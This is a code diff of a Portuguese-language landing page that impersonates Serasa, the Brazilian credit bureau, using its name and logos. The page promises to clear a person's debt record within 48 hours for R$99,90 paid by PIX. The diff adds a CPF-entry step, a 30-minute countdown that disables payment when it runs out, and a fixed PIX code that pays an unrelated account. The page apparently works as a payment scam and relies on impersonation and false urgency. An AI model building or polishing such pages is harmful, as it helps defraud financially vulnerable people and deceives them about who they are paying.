@@ -1,43 +1,31 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  
-  <!-- Título da Página -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
   <title>Limpe seu nome com desconto via PIX | Serasa</title>
-  
-  <!-- Meta descrição para SEO -->
-  <meta name="description" content="Aproveite uma oferta exclusiva e regularize seu nome com  desconto via PIX. Seu nome limpo em até 48 horas. Pague agora!">
 
-  <!-- Open Graph (Facebook, WhatsApp, LinkedIn etc) -->
-  <meta property="og:title" content="Limpe seu nome com  desconto via PIX | Serasa" />
-  <meta property="og:description" content="Aproveite uma oferta exclusiva e regularize seu nome com  desconto via PIX. Seu nome limpo em até 48 horas." />
+  <!-- SEO + Social -->
+  <meta name="description" content="Aproveite uma oferta exclusiva e regularize seu nome com desconto via PIX. Seu nome limpo em até 48 horas. Pague agora!">
+  <meta property="og:title" content="Limpe seu nome com desconto via PIX | Serasa" />
+  <meta property="og:description" content="Oferta exclusiva! Regularize seu nome com desconto via PIX. Seu nome limpo em até 48h." />
   <meta property="og:image" content="https://files.sunoresearch.com.br/p/uploads/2020/06/serasa.jpg" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://seusite.com/oferta-serasa" />
-
-  <!-- Twitter Cards -->
   <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Limpe seu nome com  desconto via PIX | Serasa" />
-  <meta name="twitter:description" content="Oferta imperdível! Regularize sua situação financeira pagando apenas R$99,90 via PIX. Válido por tempo limitado." />
+  <meta name="twitter:title" content="Limpe seu nome com desconto via PIX | Serasa" />
+  <meta name="twitter:description" content="Oferta imperdível! Regularize sua situação financeira pagando apenas R$99,90 via PIX." />
   <meta name="twitter:image" content="https://files.sunoresearch.com.br/p/uploads/2020/06/serasa.jpg" />
-
-  <!-- Favicon (opcional) -->
   <link rel="icon" href="https://www.serasa.com.br/favicon.ico" type="image/x-icon" />
-</head>
 
-  
   <style>
     :root {
       --rosa-principal: #ec008c;
       --rosa-escuro: #c20074;
       --texto-claro: #ffffff;
-      --texto-cinza: #f0f0f0;
+      --preto-fundo: #000000;
+      --cinza-claro: #f1f1f1;
+      --cinza-escuro: #444444;
     }
 
     * {
@@ -46,7 +34,7 @@
       box-sizing: border-box;
     }
 
-    body {
+    html, body {
       font-family: "Segoe UI", sans-serif;
       background-color: var(--rosa-principal);
       color: var(--texto-claro);
@@ -55,37 +43,53 @@
       align-items: center;
       min-height: 100vh;
       padding: 20px;
-      zoom: 1.1;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
     .card {
       background-color: #fff;
       color: #333;
-      max-width: 460px;
+      max-width: 480px;
       width: 100%;
       border-radius: 16px;
-      padding: 30px 20px;
-      box-shadow: 0 0 30px rgba(0,0,0,0.1);
+      padding: 30px 25px;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
       text-align: center;
       animation: fadeIn 0.4s ease-in-out;
+      transition: box-shadow 0.3s ease;
+    }
+
+    .card:hover {
+      box-shadow: 0 12px 40px rgba(0,0,0,0.2);
+    }
+
+    .logo {
+      max-width: 200px;
+      height: auto;
+      margin-bottom: 20px;
+      user-select: none;
+      pointer-events: none;
     }
 
     h1 {
-      font-size: 24px;
-      font-weight: bold;
+      font-size: 26px;
+      font-weight: 700;
       color: var(--rosa-principal);
       margin-bottom: 10px;
+      user-select: none;
     }
 
     .subtitulo {
-      color: #666;
-      font-size: 14px;
+      color: var(--cinza-escuro);
+      font-size: 15px;
       margin-bottom: 20px;
+      user-select: none;
     }
 
     .preco {
       font-size: 22px;
-      font-weight: bold;
+      font-weight: 700;
       margin: 15px 0;
     }
 
@@ -94,64 +98,114 @@
       color: #999;
       font-size: 16px;
       margin-right: 8px;
+      user-select: none;
     }
 
     .preco .atual {
       color: var(--rosa-principal);
+      user-select: none;
+    }
+
+    #cronometro {
+      font-size: 18px;
+      font-weight: 700;
+      margin-bottom: 15px;
+      color: var(--texto-claro);
+      background-color: var(--preto-fundo);
+      display: inline-block;
+      padding: 8px 20px;
+      border-radius: 15px;
+      user-select: none;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      letter-spacing: 0.03em;
     }
 
     .pix-container {
-      background-color: #f9f9f9;
+      background-color: var(--cinza-claro);
       padding: 15px;
-      border: 1px dashed var(--rosa-principal);
-      border-radius: 10px;
-      word-break: break-all;
-      font-size: 13px;
-      margin: 15px 0;
+      border: 1.5px dashed var(--rosa-principal);
+      border-radius: 12px;
+      font-size: 14px;
+      margin: 20px 0;
+      word-break: break-word;
+      user-select: all;
     }
 
-    .btn-copiar {
+    .btn-copiar, .btn-continuar {
       background-color: var(--rosa-principal);
       color: #fff;
       border: none;
-      padding: 12px 20px;
+      padding: 14px 24px;
       border-radius: 30px;
-      font-weight: bold;
+      font-weight: 700;
       cursor: pointer;
-      font-size: 14px;
-      transition: 0.3s;
-      margin: 10px auto;
+      font-size: 16px;
+      transition: background-color 0.3s ease;
+      margin-top: 15px;
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      gap: 8px;
+      justify-content: center;
+      width: 100%;
+      max-width: 320px;
+      user-select: none;
     }
 
-    .btn-copiar:hover {
+    .btn-copiar:hover,
+    .btn-continuar:hover {
       background-color: var(--rosa-escuro);
+    }
+
+    .btn-copiar:disabled {
+      cursor: not-allowed;
+      opacity: 0.5;
     }
 
     .copiado {
       display: none;
       color: green;
       font-size: 13px;
-      margin-top: 5px;
+      margin-top: 8px;
+      user-select: none;
     }
 
     .instrucoes {
-      margin-top: 20px;
+      margin-top: 25px;
       text-align: left;
       font-size: 14px;
-      color: #444;
+      color: var(--cinza-escuro);
+      line-height: 1.6;
+      user-select: none;
     }
 
     .instrucoes h3 {
       color: var(--rosa-principal);
-      font-size: 16px;
-      margin-bottom: 10px;
+      font-size: 17px;
+      margin-bottom: 12px;
+      user-select: none;
     }
 
     .instrucoes ol {
-      padding-left: 20px;
+      padding-left: 22px;
+      margin-bottom: 0;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1.8px solid #ccc;
+      border-radius: 10px;
+      margin-bottom: 18px;
+      text-align: center;
+      transition: border-color 0.3s ease;
+      user-select: text;
+    }
+
+    input[type="text"]:focus {
+      border-color: var(--rosa-principal);
+      outline: none;
+      box-shadow: 0 0 8px rgba(236, 0, 140, 0.5);
     }
 
     @keyframes fadeIn {
@@ -165,29 +219,73 @@
       }
     }
 
-    @media (max-width: 500px) {
-      body {
-        zoom: 1;
+    @media (max-width: 600px) {
+      html, body {
+        padding: 10px;
       }
 
       .card {
-        padding: 25px 15px;
+        padding: 25px 18px;
       }
 
-      .pix-container {
-        font-size: 12px;
+      .logo {
+        max-width: 160px;
       }
 
       h1 {
+        font-size: 22px;
+      }
+
+      .subtitulo {
+        font-size: 14px;
+      }
+
+      .preco {
         font-size: 20px;
+      }
+
+      #cronometro {
+        font-size: 16px;
+        padding: 6px 14px;
+        border-radius: 12px;
+      }
+
+      .pix-container {
+        font-size: 13px;
+      }
+
+      .btn-copiar, .btn-continuar {
+        font-size: 15px;
+        padding: 12px 20px;
+        max-width: 100%;
+      }
+
+      input[type="text"] {
+        font-size: 15px;
+        padding: 12px 14px;
       }
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
+  <!-- Tela CPF -->
+  <div class="card" id="cpfForm">
+    <img src="https://nfe.io/docs/app/uploads/2021/03/Serasa-Experian-logo.jpg" alt="Logo Serasa" class="logo" />
+    <h1>Digite seu CPF</h1>
+    <p class="subtitulo">Antes de continuar, valide seu CPF</p>
+    <input type="text" id="cpfInput" placeholder="000.000.000-00" oninput="formatarCPF(this)" maxlength="14" autocomplete="off" />
+    <button class="btn-continuar" onclick="verificarCPF()">Continuar</button>
+  </div>
+
+  <!-- Tela da oferta -->
+  <div class="card" id="ofertaCard" style="display: none;">
     <h1>Limpe seu nome com desconto</h1>
+
+    <div id="cronometro">
+      Oferta válida por: <span id="timer">30:00</span>
+    </div>
+
     <p class="subtitulo">Oferta exclusiva para regularização via PIX</p>
 
     <div class="preco">
@@ -196,16 +294,14 @@
     </div>
 
     <p>Copie o código PIX abaixo e pague agora mesmo:</p>
-    <div class="pix-container" id="pixCode">
+    <div class="pix-container" id="pixCode" tabindex="0" aria-label="Código PIX para copiar">
       00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/a939199fce9644dab1c263a6a7e3597e5204000053039865802BR5905EFISA6008SAOPAULO62070503***630458C2
     </div>
 
-    <button class="btn-copiar" onclick="copiarPix()">
-      📋 Copiar código PIX
-    </button>
-    <div class="copiado" id="mensagemCopiado">Código copiado com sucesso!</div>
+    <button class="btn-copiar" onclick="copiarPix()" aria-label="Copiar código PIX para área de transferência">📋 Copiar código PIX</button>
+    <div class="copiado" id="mensagemCopiado" role="alert" aria-live="polite">Código copiado com sucesso!</div>
 
-    <div class="instrucoes">
+    <div class="instrucoes" aria-label="Instruções para pagamento via PIX">
       <h3>Como pagar com PIX Copia e Cola:</h3>
       <ol>
         <li>Acesse o app do seu banco</li>
@@ -217,6 +313,72 @@
   </div>
 
   <script>
+    // Formata o CPF enquanto digita
+    function formatarCPF(input) {
+      let value = input.value.replace(/\D/g, '');
+      if (value.length > 11) value = value.slice(0, 11);
+      value = value.replace(/(\d{3})(\d)/, "$1.$2");
+      value = value.replace(/(\d{3})(\d)/, "$1.$2");
+      value = value.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+      input.value = value;
+    }
+
+    // Validação do CPF
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/[^\d]+/g, '');
+      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+
+      let soma = 0;
+      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+      let resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      if (resto !== parseInt(cpf.charAt(9))) return false;
+
+      soma = 0;
+      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+      resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      return resto === parseInt(cpf.charAt(10));
+    }
+
+    // Verifica o CPF e mostra oferta + inicia cronômetro
+    function verificarCPF() {
+      const cpfInput = document.getElementById("cpfInput");
+      const cpf = cpfInput.value.trim();
+
+      if (validarCPF(cpf)) {
+        document.getElementById("cpfForm").style.display = "none";
+        document.getElementById("ofertaCard").style.display = "block";
+        iniciarCronometro(60 * 30, document.querySelector('#timer')); // 30 minutos
+      } else {
+        alert("CPF inválido. Verifique e tente novamente.");
+        cpfInput.focus();
+      }
+    }
+
+    // Cronômetro regressivo
+    function iniciarCronometro(duracao, display) {
+      let timer = duracao, minutos, segundos;
+      const intervalo = setInterval(function () {
+        minutos = parseInt(timer / 60, 10);
+        segundos = parseInt(timer % 60, 10);
+
+        minutos = minutos < 10 ? "0" + minutos : minutos;
+        segundos = segundos < 10 ? "0" + segundos : segundos;
+
+        display.textContent = minutos + ":" + segundos;
+
+        if (--timer < 0) {
+          clearInterval(intervalo);
+          display.parentElement.innerHTML = "<span style='color:#cc0000; font-weight:bold;'>⛔ Tempo esgotado. A oferta expirou!</span>";
+          const btnCopiar = document.querySelector('.btn-copiar');
+          btnCopiar.disabled = true;
+          btnCopiar.style.opacity = 0.5;
+        }
+      }, 1000);
+    }
+
+    // Copiar código PIX para a área de transferência
     function copiarPix() {
       const codigo = document.getElementById("pixCode").innerText;
       navigator.clipboard.writeText(codigo).then(() => {
@@ -224,10 +386,11 @@
         msg.style.display = "block";
         setTimeout(() => {
           msg.style.display = "none";
-        }, 2000);
+        }, 2500);
+      }).catch(() => {
+        alert("Não foi possível copiar o código PIX. Por favor, copie manualmente.");
       });
     }
   </script>
-
 </body>
 </html>
